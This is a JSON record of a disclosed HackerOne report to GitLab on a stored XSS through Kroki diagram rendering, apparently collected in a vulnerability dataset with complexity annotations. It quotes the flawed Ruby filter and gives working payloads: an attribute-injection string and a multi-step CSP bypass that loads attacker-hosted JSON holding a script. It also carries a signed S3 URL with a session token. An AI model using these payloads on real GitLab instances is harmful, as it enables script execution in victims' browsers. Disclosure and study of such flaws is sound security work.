{
  "reported_to": "GitLab",
  "reported_by": "vakzz ",
  "title": "Stored XSS via Kroki diagram",
  "content": "\nSummary\nIf Kroki has been enabled, it's possible to craft a pre block so that arbitrary attributes can be injected into the resulting img tag.\nThe css selector for finding a valid node to convert into a kroki diagram checks for either pre[lang=\"#{diagram_type}\"] > code or for pre > code[lang=\"#{diagram_type}\"], but the diagram type is then set using node.parent['lang'] || node['lang'].\nSo if the code block has a valid lang (such as wavedrom) then the css selector will match, but if the parent pre also has a lang attribute then it will be the one that is used and can be an arbitrary value.\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L17\nCode 709 Bytes\n1        diagram_selectors = ::Gitlab::Kroki.formats(settings)\n2                                .map do |diagram_type|\n3                                  %(pre[lang=\"#{diagram_type}\"] > code,\n4                                  pre > code[lang=\"#{diagram_type}\"])\n5                                end\n6                                .join(', ')\n7\n8        xpath = Gitlab::Utils::Nokogiri.css_to_xpath(diagram_selectors)\n9        return doc unless doc.at_xpath(xpath)\n10\n11        diagram_format = \"svg\"\n12        doc.xpath(xpath).each do |node|\n13          diagram_type = node.parent['lang'] || node['lang']\n14          diagram_src = node.content\n15          image_src = create_image_src(diagram_type, diagram_format, diagram_src)\nThe diagram_type is then used as-is to create a url, which is used to create an image with <img src=\"#{image_src}\" />. So if a double quote is used in the diagram_type then arbitrary attributes can be added (apart from class as that is replaced just below).\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L31\nCode 649 Bytes\n1          image_src = create_image_src(diagram_type, diagram_format, diagram_src)\n2          img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src=\"#{image_src}\" />))\n3          img_tag = img_tag.children.first\n4\n5          next if img_tag.nil?\n6\n7          lazy_load = diagram_src.length > MAX_CHARACTER_LIMIT\n8          img_tag.set_attribute('hidden', '') if lazy_load\n9          img_tag.set_attribute('class', 'js-render-kroki')\n10\n11          img_tag.set_attribute('data-diagram', diagram_type)\n12          img_tag.set_attribute('data-diagram-src', \"data:text/plain;base64,#{Base64.strict_encode64(diagram_src)}\")\n13\n14          node.parent.replace(img_tag)\nSteps to reproduce\n<image_0>\nCreate an issue and use the following payload <a><pre lang='f/\" onerror=alert(1) onload=alert(1) '><code lang=\"wavedrom\">xss</code></pre></a>\nReload/Visit the issue\nIf you do not have CSP enabled you will see the alert pop, otherwise you will see a CSP violation in the console such as Refused to execute inline event handler because it violates the following Content Security Policy directive\nSince the class attribute cannot be set finding a CSP bypass was a bit tricky but there are still a few data based attributes that can be used, one of them being data-diff-for-path from single_file_diff.js. This is used as the path to load when the \"expand diff\" chevron is clicked allowing an arbitrary json file to be loaded and have jquery execute it to bypass the CSP.\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/app/assets/javascripts/single_file_diff.js#L77\nCode 173 Bytes\n1    return axios\n2      .get(this.diffForPath)\n3      .then(({ data }) => {\n4        this.loadingContent.hide();\n5        if (data.html) {\n6          this.content = $(data.html);\nSince clicking the chevron is a bit unlikely, we can inject the style attribute to make the kroki overlay the entire page, which when clicked injects some styles to make the chevron now overlay the entire page.\nEnable CSP on gitlab - https://docs.gitlab.com/omnibus/settings/configuration.html#set-a-content-security-policy\nCreate a public snippet with a json file aaa.json containing {\"html\":\"<script>alert(document.domain)</script>\"}, then open the raw version and make note of the path.\nCreate a new project and commit a readme\nView the individual commit (eg http://gitlab.wbowling.info/root/kroki1/-/commit/f4170b940214abeebc6fd7503f9500c72c358613)\nAdd a comment to a line of the commit using the following payload, replacing data-diff-for-path with the path to your json file noted above:\nCode 640 Bytes\n1<a>\n2    <pre lang='/\" data-diff-for-path=/root/kroki1/-/snippets/9/raw/main/aaa.json '>\n3        <code lang=\"wavedrom\">csp</code>\n4    </pre>\n5    <pre\n6        lang='/\" id=stage1 style=\"position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;\" data-triggers=\"click\" data-toggle=popover data-html=true data-title=\"aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb\" data-content=ggg '>\n7    <code lang=\"wavedrom\">\n8    bypass\n9    </code>\n10    </pre>\n11</a>\nReload the page\nClicking anywhere on the page twice will trigger the xss\nImpact\nAllows arbitrary javascript to be executed when a victim views a comment\nWhat is the current bug behavior?\nThe the lang attribute from the parent node is always used even if the css selector matches the child node\nWhat is the expected correct behavior?\nThe lang attribute should only be used if it is actually valid. The img tag should also be created using content_tag instead of string concatination.\nOutput of checks\nResults of GitLab environment info\nCode 849 Bytes\n1$ sudo gitlab-rake gitlab:env:info\n2\n3System information\n4System:\t\tUbuntu 20.04\n5Proxy:\t\tno\n6Current User:\tgit\n7Using RVM:\tno\n8Ruby Version:\t2.7.6p219\n9Gem Version:\t3.1.6\n10Bundler Version:2.3.15\n11Rake Version:\t13.0.6\n12Redis Version:\t6.2.7\n13Sidekiq Version:6.5.7\n14Go Version:\tunknown\n15\n16GitLab information\n17Version:\t15.6.2-ee\n18Revision:\t08b668e8740\n19Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n20DB Adapter:\tPostgreSQL\n21DB Version:\t12.12\n22URL:\t\thttp://gitlab.wbowling.info\n23HTTP Clone URL:\thttp://gitlab.wbowling.info/some-group/some-project.git\n24SSH Clone URL:\tgit@gitlab.wbowling.info:some-group/some-project.git\n25Elasticsearch:\tno\n26Geo:\t\tno\n27Using LDAP:\tno\n28Using Omniauth:\tyes\n29Omniauth Providers:\n30\n31GitLab Shell\n32Version:\t14.13.0\n33Repository storage paths:\n34- default: \t/var/opt/gitlab/git-data/repositories\n35GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nImpact\nAllows arbitrary javascript to be executed when a victim views a comment\n\n",
  "severity": [
    8.7,
    null
  ],
  "bounty": 13950,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i9bru7rouwb1vw0z1eff4onfyntv?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5LA7DQI%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T235546Z&X-Amz-Expires=1370&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCc9YRXRTUx7Idj8qb1jMs8QfGH8fy%2Fdyzg5FiBsjhXcwIhAKoWaqUpLoKkj2Q%2FKa8PGA5BO4fH3QsXEC83tqvrkQarKroFCPP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzOHB4MdDjRzMCG6vIqjgW2GK%2FCSrsbka9rau%2B54wjD1LthKu7b7GofM5pKLSqbaiVagCLur49Dv%2BvNq0a9o9UIDTTwM03gNZhtnaWqyehDfLh0XbcKXSfCmg9%2B0coUBWlEAFCEbWPghkXZZFPfpGmI36BD%2FjHP1kZ6XuN5J8aWdXRhMK4NyvjK%2Fm7%2BzkFEBintTo%2FNphm6eqxqOzYNEe1QvrZ03iBYRZEIXBoXfuIHSJIih81fI92B%2FB2ZnDOfTzAbI083G9czb06XbwwFqp2P8OOh2YJc3k10ECUrlsBo1dkoBH3h9qC%2FcEpsrPtRwVCPRmG4J3wneQmewR%2FrzULqW3CbI29V89VlUPpQl5UML%2FDHhlou5IUAqMn0Liufkd60KRdJS%2Bahn4dhPHN3oJtQj6O0A%2F7A3MOhPz%2ByCdoeHs3VNQo3rVrTJGHxF35LzmrYVysN6qSNkpCpQsJyuyUBTm2xoF%2FXjDlQPo1mH%2FxOcFNQPJu02iJHx%2FPZjj%2FW2II%2BqoE%2FiHgiwXE1nVgOiSaKfG9HtMpzTZ23EQRdAud7Q13KrEcI%2BNjIZghSp8sYXBgSSRg5aobdzGtLGobJ4xeF0dp%2FMvmi1mzCcxLR3yWX2uiiYQE57n9eeNqRoeKfh57x0TcJuf0TfcXZTbN33tGcZ1b8qoWpYfe4fz8bouYBFBD6EIXv49hmHrMktYgpIUaVFxIeiGL3DfEFbMoVYZb0HLi24dFvH78MZfCV5pMBxZk5dHz4fRO7qVHEutQTOCKUqiGEhknbdTuU7otiJhFyeimoJgo1Sa8NsTXWvCY5CUX5N4wTM5jPdHOI3jBbOHgWBC4A6MnZV90bLHNcX0ZWml0ZNSTZO3CU3U2ZrP5r%2FktibBLhpPyUlhRuvV0wurqGvwY6sAGXzAf33n8WVCnRFn68JktYUcbOaeC2aVHjNhAbYa%2B1YsEqAkpoz2gIX5M3wZu5iJ%2F86GPsW3o3PSVErs%2BtQrmSkl3cSYZc%2BJWcvaYaGTirkMGg6Pr94SkL0OUDuUbCiqLqicvXacfZyfn0Rem0cZtH%2FurPe1A%2Fk078EVQv%2FaaAEAfc%2B6VVPBs%2BODhaqlSAh%2FSQmiTy%2Fq4SshBRcgFaFqiuGSxUgqyqt8gGCu0Uqgc4IQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ecfa74e19283823822c6f4b49918f96ef008f3961cf75a9a1e90f28c520fd1fd"
  },
  "disclosed_date": 1685685300,
  "report_url": "https://hackerone.com/reports/1731349",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create an issue and use the following payload <a><pre lang='f/\" onerror=alert(1) onload=alert(1) '><code lang=\"wavedrom\">xss</code></pre></a>"
    ],
    [
      2,
      "Reload/Visit the issue"
    ]
  ],
  "vuln_description": "The vulnerability is a stored XSS via Kroki diagram where arbitrary attributes can be injected into the resulting img tag due to improper handling of the lang attribute in the parent node. This allows for arbitrary JavaScript execution when a victim views a comment.",
  "reason": "The attack involves understanding the interaction between the parent and child nodes' lang attributes, crafting a payload that exploits this interaction, and bypassing CSP restrictions. The complexity arises from the need to understand the subtle interaction between the nodes and the CSP bypass technique.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves manipulating the 'lang' attribute in a pre/code block to inject arbitrary attributes into an img tag, which is a client-side DOM manipulation issue rather than an authentication or authorization bypass. The methodology described focuses on server-side AuthN/AuthZ issues by testing different user sessions and resource IDs, which does not apply to this XSS vulnerability.",
    "is_detectable": false
  }
}